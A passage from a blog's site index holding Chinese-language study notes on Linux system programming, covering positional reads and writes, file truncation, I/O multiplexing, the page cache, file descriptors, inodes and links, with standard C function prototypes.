;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br>&#x8BBE;&#x7F6E;&#x4E86;&#x504F;&#x79FB;&#x4E3A;&#x5F53;&#x524D;&#x4F4D;&#x7F6E;&#x504F;&#x79FB;5&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x5F00;&#x59CB;&#x8BFB;&#x5165;&#x4E3A;6&#xFF0C;&#x56E0;&#x6B64;&#x8F93;&#x51FA;&#x4E3A;6.<br>&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;&#x5DF2;&#x7ECF;&#x6539;&#x53D8;&#x4E86;&#x6587;&#x4EF6;&#x504F;&#x79FB;&#xFF0C;&#x53E6;&#x5916;&#x4E24;&#x4E2A;&#x63A5;&#x53E3;&#x5C31;&#x662F;&#x76F4;&#x63A5;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x8BFB;&#x5199;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x4F1A;&#x6539;&#x53D8;&#x539F;&#x59CB;&#x504F;&#x79FB;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pread</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> count, <span class="hljs-keyword">off_t</span> pos)</span></span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pwrite</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> count, <span class="hljs-keyword">off_t</span> pos)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>pos&#x662F;&#x7EDD;&#x5BF9;&#x504F;&#x79FB;<p></p><h3 id="&#x6587;&#x4EF6;&#x622A;&#x65AD;"><a href="#&#x6587;&#x4EF6;&#x622A;&#x65AD;" class="headerlink" title="&#x6587;&#x4EF6;&#x622A;&#x65AD;"></a>&#x6587;&#x4EF6;&#x622A;&#x65AD;</h3><p>&#x5C31;&#x662F;&#x628A;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x8BBE;&#x7F6E;&#x4E3A;&#x6307;&#x5B9A;&#x957F;&#x5EA6;&#xFF0C;&#x957F;&#x4E86;&#x622A;&#x65AD;&#xFF0C;&#x77ED;&#x4E86;&#x8865;0<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ftruncate</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> len)</span></span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">truncate</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">off_t</span> len)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x4E24;&#x4E2A;&#x63A5;&#x53E3;&#xFF0C;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x4E00;&#x4E2A;&#x53EF;&#x5199;&#x7684;fd&#xFF0C;&#x4E00;&#x4E2A;&#x76F4;&#x63A5;&#x64CD;&#x4F5C;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;<p></p><h3 id="I-O&#x591A;&#x8DEF;&#x590D;&#x7528;-IO-multiplexing"><a href="#I-O&#x591A;&#x8DEF;&#x590D;&#x7528;-IO-multiplexing" class="headerlink" title="I/O&#x591A;&#x8DEF;&#x590D;&#x7528; (IO multiplexing)"></a>I/O&#x591A;&#x8DEF;&#x590D;&#x7528; (IO multiplexing)</h3><p>&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x6211;&#x4EEC;&#x8981;&#x8FDB;&#x884C;&#x591A;&#x4E2A;I/O&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;read&#xFF0C;&#x963B;&#x585E;&#x7B49;&#x5F85;&#x6570;&#x636E;&#x5230;&#x6765;&#xFF1B;&#x4E00;&#x79CD;&#x5F88;&#x5E38;&#x89C4;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x76D1;&#x542C;&#x7B49;&#x5F85;&#x6570;&#x636E;&#x3002;I/O&#x591A;&#x8DEF;&#x590D;&#x7528;&#x8BF4;&#x7B80;&#x5355;&#x70B9;&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x6765;&#x5BF9;&#x591A;&#x4E2A;I/O&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#xFF0C;&#x57FA;&#x672C;&#x539F;&#x7406;&#x662F;&#x8BE5;&#x8FDB;&#x7A0B;&#x4E0D;&#x65AD;&#x67E5;&#x8BE2;&#x6240;&#x8D1F;&#x8D23;I/O&#xFF0C;&#x5F53;&#x67D0;&#x4E2A;I/O&#x6709;&#x6570;&#x636E;&#x8FBE;&#x5230;&#x65F6;&#xFF0C;&#x5C31;&#x901A;&#x77E5;&#x7528;&#x4E8E;&#x8FDB;&#x7A0B;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x3002;<br>&#x5BF9;&#x8BE5;&#x65B9;&#x6CD5;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;3&#x4E2A;&#x63A5;&#x53E3;&#xFF1A;select&#x3001;poll&#x3001;epoll&#xFF0C;&#x8FD9;&#x4E2A;&#x63A5;&#x53E3;&#x4E5F;&#x662F;&#x4F9D;&#x6B21;&#x4F18;&#x5316;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x5E38;&#x7528;&#x4E8E;WebServer&#x7684;&#x5904;&#x7406;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x8981;&#x5904;&#x7406;&#x4E0D;&#x540C;&#x7528;&#x6237;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5982;nginx&#x4E2D;&#x4F7F;&#x7528;&#x4E86;epoll&#x3002;<br>&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x53C2;&#x8003;&#xFF1A;<a href="https://segmentfault.com/a/1190000003063859#articleHeader9" target="_blank" rel="noopener">https://segmentfault.com/a/1190000003063859#articleHeader9</a><br>&#x8BE6;&#x7EC6;&#x63CF;&#x8FF0;&#x53C2;&#x8003;&#xFF1A;<a href="https://www.zhihu.com/question/32163005" target="_blank" rel="noopener">https://www.zhihu.com/question/32163005</a> &#xFF08;&#x5305;&#x542B;&#x5BF9;&#x4E09;&#x4E2A;&#x63A5;&#x53E3;&#x7684;&#x6BD4;&#x8F83;&#xFF09;</p><h3 id="&#x5185;&#x6838;&#x5185;&#x5E55;"><a href="#&#x5185;&#x6838;&#x5185;&#x5E55;" class="headerlink" title="&#x5185;&#x6838;&#x5185;&#x5E55;"></a>&#x5185;&#x6838;&#x5185;&#x5E55;</h3><p>&#x8FD9;&#x90E8;&#x5206;&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;Linux&#x5185;&#x6838;&#x662F;&#x5982;&#x4F55;&#x5B9E;&#x73B0;I/O&#x7684;<br>** &#x865A;&#x62DF;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF; (VFS) **<br>&#x53EF;&#x4EE5;&#x770B;&#x6210;&#x662F;&#x5BF9;&#x4E0D;&#x540C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;(&#x5982;NTFS&#x7B49;)&#x7684;&#x4E00;&#x4E2A;&#x5C01;&#x88C5;&#xFF0C;&#x7136;&#x540E;&#x63D0;&#x4F9B;&#x63A5;&#x53E3;&#x7ED9;&#x4E0A;&#x5C42;&#x7A0B;&#x5E8F;&#x5458;&#x8C03;&#x7528;&#xFF1B;&#x7A0B;&#x5E8F;&#x5458;&#x4E0D;&#x9700;&#x8981;&#x5173;&#x5FC3;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x4ECB;&#x8D28;&#xFF0C;&#x901A;&#x8FC7;&#x7EDF;&#x4E00;&#x63A5;&#x53E3;&#x5904;&#x7406;&#x5373;&#x53EF;&#x3002;<br>** &#x9875;&#x7F13;&#x5B58; **<br>&#x7B80;&#x5355;&#x8BF4;&#x662F;&#x5229;&#x7528;&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;&#xFF0C;&#x5C06;&#x6700;&#x8FD1;&#x8BBF;&#x95EE;&#x7684;&#x6570;&#x636E;&#x5B58;&#x5165;&#x5230;&#x5185;&#x5B58;&#x4E4B;&#x4E2D;&#xFF0C;&#x63D0;&#x9AD8;&#x4E0B;&#x4E00;&#x6B21;&#x7684;&#x8BBF;&#x95EE;&#x901F;&#x7387;&#xFF08;&#x5F53;&#x7136;&#x662F;&#x57FA;&#x4E8E;&#x5047;&#x8BBE;&#x6700;&#x8FD1;&#x8BBF;&#x95EE;&#x7684;&#x6570;&#x636E;&#x518D;&#x6B21;&#x8BBF;&#x95EE;&#x7684;&#x6982;&#x7387;&#x8F83;&#x5927;&#xFF09;<br>** &#x9875;&#x56DE;&#x5199; **<br>&#x4E5F;&#x5C31;&#x662F;&#x524D;&#x9762;write&#x4E2D;&#x7684;&#x5EF6;&#x8FDF;&#x5199;&#xFF0C;&#x6EE1;&#x8DB3;&#x4EE5;&#x4E0B;&#x6761;&#x4EF6;&#x65F6;&#x4F1A;&#x5C06;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x78C1;&#x76D8;&#xFF1A;</p><ol><li>&#x5F53;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;&#x8BBE;&#x5B9A;&#x7684;&#x9608;&#x503C;&#x65F6;</li><li>&#x5F53;&#x4E00;&#x4E2A;&#x810F;&#x7684;&#x7F13;&#x51B2;&#x533A;(&#x5B58;&#x50A8;&#x5C06;&#x8981;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x79F0;&#x4E4B;&#x4E3A;&#x810F;&#x7F13;&#x51B2;&#x533A;)&#x5BFF;&#x547D;&#x8D85;&#x8FC7;&#x8BBE;&#x5B9A;&#x7684;&#x9608;&#x503C;&#x65F6;<br>&#x56DE;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x7531;pdflush&#x5185;&#x6838;&#x7EBF;&#x7A0B;&#x64CD;&#x4F5C;&#xFF0C;&#x5F53;&#x51FA;&#x73B0;&#x4E0A;&#x8FF0;&#x6761;&#x4EF6;&#x4E4B;&#x4E00;&#xFF0C;pdflush&#x7EBF;&#x7A0B;&#x5C06;&#x88AB;&#x5524;&#x9192;&#xFF0C;&#x5E76;&#x5F00;&#x59CB;&#x56DE;&#x5199;&#x3002;</li></ol></body></html>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统编程导读 - 简介</title>
      <link href="/2017/09/18/Linux-System-Programming/"/>
      <url>/2017/09/18/Linux-System-Programming/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x8BF4;&#x662F;Linux&#x7CFB;&#x7EDF;&#x7F16;&#x7A0B;&#x4E00;&#x4E66;&#x7684;&#x5BFC;&#x8BFB;&#xFF0C;&#x5176;&#x5B9E;&#x53EA;&#x662F;&#x5BF9;Linux&#x7CFB;&#x7EDF;&#x7F16;&#x7A0B;&#x7684;&#x5B66;&#x4E60;&#x7B14;&#x8BB0;&#x5427;&#x3002;&#x7CFB;&#x7EDF;&#x7F16;&#x7A0B;&#x5176;&#x5B9E;&#x8BF4;&#x5230;&#x5E95;&#x5C31;&#x662F;&#x501F;&#x7528;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6240;&#x63D0;&#x4F9B;&#x7684;API&#x8FDB;&#x884C;&#x4E00;&#x4E9B;&#x5E95;&#x5C42;&#x529F;&#x80FD;&#x6027;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x5C3D;&#x53EF;&#x80FD;&#x53BB;&#x4E86;&#x89E3;&#x5176;&#x5DE5;&#x4F5C;&#x7684;&#x539F;&#x7406;&#x3002;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x76EE;&#x5F55;&#xFF0C;&#x4E3B;&#x8981;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x90E8;&#x5206;&#xFF1A;<br>&#x6587;&#x4EF6;&#x7684;&#x64CD;&#x4F5C;(I/O); &#x8FDB;&#x7A0B;; &#x5185;&#x5B58;; &#x4FE1;&#x53F7;; &#x65F6;&#x95F4;&#x3002;&#x4E5F;&#x5C31;&#x4E3B;&#x8981;&#x5206;&#x4E3A;&#x8FD9;&#x51E0;&#x4E2A;&#x90E8;&#x5206;&#x6765;&#x5B66;&#x4E60;&#x5B66;&#x4E60;&#x3002;&#x5C3D;&#x53EF;&#x80FD;&#x4F7F;&#x7528;&#x7B80;&#x77ED;&#x7684;&#x8BED;&#x8A00;&#x4EE5;&#x53CA;&#x5B9E;&#x9645;&#x7684;&#x4F8B;&#x5B50;&#x6765;&#x63CF;&#x8FF0;&#x3002;</p><h2 id="&#x7B80;&#x4ECB;"><a href="#&#x7B80;&#x4ECB;" class="headerlink" title="&#x7B80;&#x4ECB;"></a>&#x7B80;&#x4ECB;</h2><p>&#x6309;&#x7167; 1.4 Linux&#x7F16;&#x7A0B;&#x6982;&#x5FF5;&#x6765;&#x63CF;&#x8FF0;</p><h3 id="&#x6587;&#x4EF6;"><a href="#&#x6587;&#x4EF6;" class="headerlink" title="&#x6587;&#x4EF6;"></a>&#x6587;&#x4EF6;</h3><p>&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;fd&#xFF0C;&#x6211;&#x4EEC;&#x5E73;&#x65F6;&#x5728;&#x4F7F;&#x7528;Linux C&#x7684;open&#x51FD;&#x6570;&#x6765;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#x503C;&#xFF1B;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag, ... )</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x8BE5;&#x6574;&#x6570;&#x503C;&#x5C31;&#x662F;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x4E86;&#x3002;&#x5728;&#x4F7F;&#x7528;open&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x6765;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x4E86;&#x3002;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x662F;&#x5185;&#x6838;&#x4E3A;&#x4E86;&#x9AD8;&#x6548;&#x7BA1;&#x7406;&#x5DF2;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x6240;&#x521B;&#x5EFA;&#x7684;&#x7D22;&#x5F15;&#xFF1B;&#x7A0B;&#x5E8F;&#x542F;&#x52A8;&#x65F6;&#xFF0C;0&#x662F;&#x6807;&#x51C6;&#x8F93;&#x5165;&#xFF0C;1&#x662F;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF0C;2&#x662F;&#x6807;&#x51C6;&#x9519;&#x8BEF;&#x3002;&#x5982;&#x679C;&#x6B64;&#x65F6;&#x53BB;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x4F1A;&#x662F;3&#x3002;<br>&#x5BF9;&#x4E8E;&#x7528;&#x6237;&#x7A0B;&#x5E8F;&#x8FDB;&#x7A0B;&#x6765;&#x8BF4;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x90FD;&#x4F1A;&#x6709;&#x81EA;&#x5DF1;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x8868;&#x6765;&#x5BF9;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x3002;<br>&#x53C2;&#x8003;&#xFF1A;<a href="http://blog.csdn.net/cywosp/article/details/38965239" target="_blank" rel="noopener">http://blog.csdn.net/cywosp/article/details/38965239</a><p></p><ol><li>&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x600E;&#x6837;&#x548C;&#x5B9E;&#x9645;&#x6587;&#x4EF6;&#x5BF9;&#x5E94;?<br>&#x65E2;&#x7136;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x5230;&#x6587;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;&#x8BE5;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x5FC5;&#x987B;&#x80FD;&#x591F;&#x5BF9;&#x5E94;&#x5230;&#x5B9E;&#x9645;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x60F3;&#x5230;&#x4E00;&#x79CD;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x5EFA;&#x4E00;&#x4E2A;&#x5BF9;&#x5E94;&#x7684;&#x8868;&#xFF0C;&#x7D22;&#x5F15;key&#x5C31;&#x662F;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#xFF0C;&#x7136;&#x540E;value&#x5C31;&#x662F;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x591F;&#x5F88;&#x5BB9;&#x6613;&#x5F62;&#x6210;&#x5BF9;&#x5E94;&#xFF0C;&#x4E5F;&#x80FD;&#x591F;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x8BBF;&#x95EE;&#x5230;&#x5B9E;&#x9645;&#x7684;&#x6587;&#x4EF6;&#x4E86;&#x3002;<br>Linux&#x7684;&#x505A;&#x6CD5;&#x4E5F;&#x662F;&#x7C7B;&#x4F3C;&#x4E8E;&#x8FD9;&#x79CD;&#x601D;&#x60F3;&#xFF0C;&#x9996;&#x5148;&#x8FDB;&#x7A0B;&#x4F1A;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x8868;&#xFF0C;&#x8FD9;&#x4E2A;&#x8868;&#x5373;&#x8868;&#x793A;&#x8BE5;&#x8FDB;&#x7A0B;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#xFF1B;&#x5185;&#x6838;&#x5BF9;&#x6240;&#x6709;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x5EFA;&#x4E00;&#x4E2A;&#x7EDF;&#x4E00;&#x7684;&#x8868;&#x6765;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#xFF08;&#x731C;&#x6D4B;&#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x4E86;&#x5BF9;&#x4FE1;&#x606F;&#x76F8;&#x540C;&#x7684;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x53EA;&#x5B58;&#x50A8;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x51CF;&#x5C11;&#x6D88;&#x8017;&#xFF09;&#xFF0C;&#x8FDB;&#x7A0B;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x8868;&#x6307;&#x5411;&#x7EDF;&#x4E00;&#x7684;&#x8868;&#xFF0C;&#x8FD9;&#x4E2A;&#x7EDF;&#x4E00;&#x7684;&#x6253;&#x5F00;&#x8868;&#x4F1A;&#x8BB0;&#x5F55;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x7684;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#x6253;&#x5F00;&#x7684;&#x65B9;&#x5F0F;(W/R)&#x3001;&#x6587;&#x4EF6;&#x7684;&#x7C7B;&#x578B;&#x7B49;&#x7B49;&#xFF1B;&#x6211;&#x4EEC;&#x6BD4;&#x8F83;&#x5173;&#x5FC3;&#x7684;&#x662F;&#x5305;&#x542B;&#x4E00;&#x4E2A;inode&#x6307;&#x9488;&#xFF0C;&#x6307;&#x5411;&#x4E00;&#x4E2A;inode&#x8868;&#x3002;<br>inode(information node)&#x8868;&#x4E2D;&#x7684;&#x6BCF;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x57FA;&#x7840;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x5728;&#x78C1;&#x76D8;&#x4E2D;&#x7684;&#x4F4D;&#x7F6E;&#x7B49;&#xFF0C;&#x7528;&#x5B83;&#x6765;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x4E00;&#x4E2A;&#x5B9E;&#x4F53;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;&#x5B83;&#x6765;&#x8BBF;&#x95EE;&#x5230;&#x4E00;&#x4E2A;&#x5B9E;&#x4F53;&#x7684;&#x6587;&#x4EF6;&#x3002;</li></ol><h4 id="&#x76EE;&#x5F55;&#x548C;&#x94FE;&#x63A5;"><a href="#&#x76EE;&#x5F55;&#x548C;&#x94FE;&#x63A5;" class="headerlink" title="&#x76EE;&#x5F55;&#x548C;&#x94FE;&#x63A5;"></a>&#x76EE;&#x5F55;&#x548C;&#x94FE;&#x63A5;</h4><p>&#x7528;&#x6237;&#x76F4;&#x63A5;&#x901A;&#x8FC7;inode&#x6765;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x7684;&#x4E0D;&#x65B9;&#x4FBF;&#x6027;&#xFF0C;&#x56E0;&#x6B64;&#x5F15;&#x5165;&#x4E86; &#x201C;&#x76EE;&#x5F55;&#x201D; &#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x76EE;&#x5F55;&#x7528;&#x4E8E;&#x5C06;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#x548C;inode&#x7F16;&#x53F7;&#x8FDB;&#x884C;&#x6620;&#x5C04;&#xFF1B;&#x540D;&#x5B57;&#x548C;inode&#x7684;&#x914D;&#x5BF9;&#x79F0;&#x4E3A;&#x94FE;&#x63A5;&#x3002;<br>&#x5F53;&#x7528;&#x6237;&#x8BF7;&#x6C42;&#x6253;&#x5F00;a.txt&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x6587;&#x4EF6;&#x540D;&#x6307;&#x5B9A;&#x7684;&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x641C;&#x7D22;&#x8BE5;&#x6587;&#x4EF6;&#xFF0C;&#x627E;&#x5230;&#x8BE5;&#x6587;&#x4EF6;&#x540E;&#xFF0C;&#x5BF9;&#x5E94;&#x627E;&#x5230;&#x5176;inode&#x7F16;&#x53F7;&#xFF0C;&#x4ECE;&#x800C;&#x5F97;&#x5230;&#x5176;inode&#x3002;<br>&#x8BE5;&#x4E66;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x5F53;&#x7528;&#x6237;&#x8BF7;&#x6C42;&#x8BBF;&#x95EE; /home/blackbeard/landscaping.txt&#x65F6;&#xFF0C;&#x5BF9;&#x5E94;&#x6BCF;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#xFF08;&#x5E38;&#x8BF4;&#x7684;&#x6587;&#x4EF6;&#x5939;&#xFF09;&#xFF0C;&#x4E5F;&#x5C06;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;inode&#xFF1B;&#x90A3;&#x4E48;&#x627E;&#x5230;landscaping.txt&#x7684;&#x987A;&#x5E8F;&#x4E3A;&#xFF1A;&#x9996;&#x5148;&#x662F;&#x5728;&#x6839;&#x76EE;&#x5F55; &#x201C;/&#x201C;&#x4E0B;&#x9762;&#x641C;&#x7D22;&#xFF0C;&#x627E;&#x5230;home&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;inode&#xFF0C;&#x8DF3;&#x8F6C;&#x5230;&#x8BE5;&#x4F4D;&#x7F6E;&#xFF1B;&#x7EE7;&#x7EED;&#x5728;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x641C;&#x7D22;blackbeard&#xFF0C;&#x627E;&#x5230;&#x5176;&#x5BF9;&#x5E94;&#x7684;inode&#xFF0C;&#x8DF3;&#x8F6C;&#xFF1B;&#x6700;&#x540E;&#x5728;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x627E;&#x5230;landscaping.txt&#x5E76;&#x7D22;&#x5F15;&#x5F97;&#x5230;&#x5176;&#x5BF9;&#x5E94;&#x7684;inode&#xFF0C;&#x4ECE;&#x800C;&#x627E;&#x5230;&#x6587;&#x4EF6;&#x3002;<br>&#x8FD9;&#x91CC;&#x5305;&#x62EC;&#x4E24;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x5047;&#x8BBE;&#x5728;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x9762;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x4F1A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#x5230;inode&#x7684;&#x6620;&#x5C04;&#xFF0C;&#x79F0;&#x4E4B;&#x4E3A;&#x94FE;&#x63A5;(link)&#xFF1B;&#x5220;&#x9664;&#x8BE5;&#x6587;&#x4EF6;&#x65F6;&#x5C06;&#x4F1A;&#x89E3;&#x9664;&#x94FE;&#x63A5;&#xFF0C;&#x79F0;&#x4E4B;&#x4E3A;&#x5220;&#x9664;&#x94FE;&#x63A5;(unlink)&#x3002;</p><h4 id="&#x786C;&#x94FE;&#x63A5;"><a href="#&#x786C;&#x94FE;&#x63A5;" class="headerlink" title="&#x786C;&#x94FE;&#x63A5;"></a>&#x786C;&#x94FE;&#x63A5;</h4><p>&#x5982;&#x679C;&#x9700;&#x8981;&#x591A;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#x94FE;&#x63A5;&#x5230;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;&#x786C;&#x94FE;&#x63A5;&#x4E86;&#x3002;&#x8FD9;&#x4E2A;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x4FDD;&#x62A4;&#x91CD;&#x8981;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5047;&#x8BBE;&#x6709;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4E3A;&#x5176;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x786C;&#x94FE;&#x63A5;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x53BB;&#x8BBF;&#x95EE;&#xFF0C;&#x5C31;&#x7B97;&#x8BEF;&#x5220;&#x9664;&#x4E86;&#x8BE5;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x521B;&#x5EFA;&#x7684;&#x786C;&#x94FE;&#x63A5;&#x8BBF;&#x95EE;&#x5230;&#x6570;&#x636E;&#xFF1B;(ln 1.txt 2.txt 